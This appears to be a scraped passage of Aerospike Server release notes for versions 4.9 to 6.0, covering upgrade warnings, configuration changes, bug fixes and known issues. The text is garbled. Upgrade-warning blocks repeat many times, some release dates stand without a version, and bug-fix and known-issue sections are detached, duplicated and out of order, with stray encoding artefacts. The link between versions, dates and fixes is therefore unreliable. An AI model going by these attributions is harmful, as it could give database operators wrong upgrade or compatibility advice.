    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

  **Release Date:** July 19, 2021
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0.
    - Aerospike Server version 5.0 will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.

  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0.
    - Aerospike Server version 5.0 will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

  #### Known Issues

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.0.0.7)
* [5.0.0.4](#5.0.0.4)

  **Release Date:** May 21, 2020
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0.
    - Aerospike Server version 5.0 will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + XDR, using ACL, in server versions between 4.1.0.1 and 4.3.0.6 cannot ship to this version. The simplest workaround is to avoid using those versions.

  #### Improvements

  + Enterprise Only
    - [AER-6231] - (XDR) Avoid sending redundant XDR information during replication.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6228] - (KVS) Theoretical race between replication and migration could cause stale version of record to be migrated.

    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + The maximum cluster size is now increased to 256 nodes. However, the actual limit when using multicast heartbeat mode will depend on the Maximum Transmission Unit (MTU).
    - There is a 132 node limit with MTU of 1500. A 256 node limit can be achieved with an MTU of 9000.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).

Aerospike recommends the validation tool be run on all namespaces that created or modified List CDTs under a pre-4.6 server. Refer to the [Aerospike CDT Validation Tool](https://docs.aerospike.com/tools/asvalidation) documentation for steps necessary to run the tool and interpret the output.
  + Support added for [HyperLogLog (HLL) probabilistic data types](https://docs.aerospike.com/guide/data-types/hll).
    - Clusters connected using Cross Datacenter Replication (XDR) **all clusters must have been upgraded to Aerospike Server 4.9** prior to using the HyperLogLog (HLL) data type.
    - Before downgrading from Aerospike Server 4.9 all HyperLogLog (HLL) bins **must be removed** by the application.
    - During the unlikely case of a downgrade the drives would need to be wiped. It is advised to review your Aerospike Server 4.9 environment prior to implementing the usage of HyperLogLog (HLL) data type bins.
  + When upgrading to Aerospike Server v4.9.0.7 or newer to ensure migrations complete refer to the Special Upgrades document section [Avoiding partition ownership disagreement that prevents migrations from completing](https://docs.aerospike.com/operations/upgrade/special_upgrades#upgrading-to-4-9-0-7-or-newer-avoiding-partition-ownership-disagreement-that-prevents-migrations-from-completing).

  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Aerospike Server **will not start** If the value of [`default-ttl`](https://docs.aerospike.com/reference/configuration#default-ttl) is non-zero and [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) is zero (the default).
  + Record bins containing (collection data type) Ordered Lists that had operations performed under Aerospike Server versions 3.16.0.1-3.16.0.5 could be incompatible with server versions 4.6 or later due to stricter CDT validation. Also, Unordered Lists created with UDFs under server versions 3.16.0.1-4.5.3.15 could be marked as ordered, even if the application did not explicitly specify this, and would also be incompatible with server versions 4.6 or later. However induced, the incompatibility could also block XDR shipping. The [Aerospike CDT Validation Tool](https://docs.aerospike.com/tools/asvalidation) is available in the [Aerospike Tools 3.24.1](https://download.aerospike.com/download/tools/notes.html#3.24.1) or newer release to identify -and if possible correct- such records. Aerospike recommends the validation tool be run on all namespaces that created or modified List CDTs under a pre-4.6 server. Refer to the [Aerospike CDT Validation Tool](https://docs.aerospike.com/tools/asvalidation) documentation for steps necessary to run the tool and interpret the output.
  + Support added for [HyperLogLog (HLL) probabilistic data types](https://docs.aerospike.com/guide/data-types/hll).
    - Clusters connected using Cross Datacenter Replication (XDR) **all clusters must have been upgraded to Aerospike Server 4.9** prior to using the HyperLogLog (HLL) data type.
    - Before downgrading from Aerospike Server 4.9 all HyperLogLog (HLL) bins **must be removed** by the application.
    - During the unlikely case of a downgrade the drives would need to be wiped. It is advised to review your Aerospike Server 4.9 environment prior to implementing the usage of HyperLogLog (HLL) data type bins.
  + When upgrading to Aerospike Server v4.9.0.7 or newer to ensure migrations complete refer to the Special Upgrades document section [Avoiding partition ownership disagreement that prevents migrations from completing](https://docs.aerospike.com/operations/upgrade/special_upgrades#upgrading-to-4-9-0-7-or-newer-avoiding-partition-ownership-disagreement-that-prevents-migrations-from-completing).
  + When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + CentOS Linux 8 End of Life is scheduled for December 2021.

  + Record bins containing (collection data type) Ordered Lists that had operations performed under Aerospike Server versions 3.16.0.1-3.16.0.5 could be incompatible with server versions 4.6 or later due to stricter CDT validation. Also, Unordered Lists created with UDFs under server versions 3.16.0.1-4.5.3.15 could be marked as ordered, even if the application did not explicitly specify this, and would also be incompatible with server versions 4.6 or later. However induced, the incompatibility could also block XDR shipping.

  + **aerospike-tools** [7.2.0](https://download.aerospike.com/download/tools/notes.html#7.2.0)
* [6.0.0.22](#6.0.0.22)

  **Release Date:** August 30, 2023
  + **This General Availability release 6.0.0.22 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise & Federal Only
    - [AER-6665] - (XDR) Batched durable deletes will cause a crash if DC namespace context configuration item [`ship-bin-luts`](https://docs.aerospike.com/reference/configuration#ship-bin-luts) is set.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Updates

  + **aerospike-tools** [8.0.4](https://download.aerospike.com/download/tools/notes.html#8.0.4)
* [6.0.0.16](#6.0.0.16)

  **Release Date:** April 28, 2023
  + **This General Availability release 6.0.0.16 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6627] - (AGGREGATION) A range query on a list or map secondary index can overflow a record's ref-count and assert.
  + Enterprise & Federal Only
    - [AER-6628] - (KVS) For [`index-type flash`](https://docs.aerospike.com/reference/configuration#index-type) namespaces, configuring [`index-stage-size`](https://docs.aerospike.com/reference/configuration#index-stage-size) 4G or larger will cause warm restart to be abnormally slow.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.

  + **aerospike-tools** [8.0.4](https://download.aerospike.com/download/tools/notes.html#8.0.4)
* [6.0.0.9](#6.0.0.9)

  **Release Date:** December 2, 2022
  + **This General Availability release 6.0.0.9 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Improvements

  + Enterprise, Federal & Community
    - [AER-6581] - (LOGGING) Changed logging level for 'starting/finished aggregation query job...' messages from info to debug.

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6580] - (SINDEX) Deleting an indexed list or map containing multiple elements with the same value may leave inaccessible keys in the secondary index.
  + Enterprise & Federal Only
    - [AER-6582] - (XDR) Setting DC context configuration item [`tls-name`](https://docs.aerospike.com/reference/configuration#tls-name) after adding seed nodes which require it may cause a crash.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6555] - (UDF) For namespaces with data not in memory, a UDF that writes multiple bins and would exceed [`write-block-size`](https://docs.aerospike.com/reference/configuration#write-block-size) may cause a crash.
  + Enterprise & Federal Only
    - [AER-6553] - (XDR) A source node may never discover all destination nodes if it starts with partial visibility of the remote cluster.
    - [AER-6554] - (MIGRATION) For [`strong-consistency`](https://docs.aerospike.com/reference/configuration#strong-consistency) namespaces, a failed appeal may block a node from starting migrations.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  **Release Date:** April 6, 2023
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + The Predicate Expression API is obsolete. The Aerospike Server and Client have scheduled removal with our next major Aerospike Server release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`scan-show`](https://docs.aerospike.com/reference/info#scan-show) replaces `scan-list`.
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list`.

  + The configuration parameter [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests), now defaults to true, is deprecated and will be removed in six months. Customers using clients older than a year (around the time of Server 4.9 which introduced [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests)) will now have to explicitly set the [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration item to false.
  + A number of [`Best Practices`](https://docs.aerospike.com/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + The security context configuration items [`enable-security`](https://docs.aerospike.com/reference/configuration#enable-security) and [`enable-ldap`](https://docs.aerospike.com/reference/configuration#enable-ldap) have been removed. The Server will not start if either [`enable-security`](https://docs.aerospike.com/reference/configuration#enable-security) or [`enable-ldap`](https://docs.aerospike.com/reference/configuration#enable-ldap) is present in the configuration file.
  + Security will now be enabled simply by the presence of the security { } section in the configuration file. Similarly, LDAP will now be enabled simply by the presence of the ldap { } section within the security { } section of the configuration file.
  + To use XDR with ACL [`auth-mode`](https://docs.aerospike.com/reference/configuration#auth-mode) must be explicitly configured.

* [5.6.0.25](#5.6.0.25)

  **Release Date:** October 3, 2022
  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.

    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Predicate Expression API will be removed in the Aerospike Server version 6.0 release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + We have removed support for Ubuntu 16.04.
    - For more information please refer to: [Ubuntu 16.04 LTS (Xenial Xerus)](https://ubuntu.com/16-04).

    - [AER-6555] - (UDF) For namespaces with data not in memory, a UDF that writes multiple bins and would exceed [`write-block-size`](https://docs.aerospike.com/reference/configuration#write-block-size) may cause a crash.
  + Enterprise Only
    - [AER-6553] - (XDR) A source node may never discover all destination nodes if it starts with partial visibility of the remote cluster.
    - [AER-6554] - (MIGRATION) For [`strong-consistency`](https://docs.aerospike.com/reference/configuration#strong-consistency) namespaces, a failed appeal may block a node from starting migrations.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6523] - (EXPRESSIONS) An empty expression may cause a crash, and a 1-byte expression operation with value zero is misinterpreted as a legacy predexp filter.
  + Enterprise Only
    - [AER-6521] - (STORAGE) For [`storage-engine pmem`](https://docs.aerospike.com/reference/configuration#storage-engine) namespaces, dynamically setting [`defrag-lwm-pct`](https://docs.aerospike.com/reference/configuration#defrag-lwm-pct) will set one-eighth the intended threshold.
    - [AER-6520] - (XDR) Removing multiple connector seed nodes in rapid succession may cause an assertion.

  **Release Date:** March 21, 2022
  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
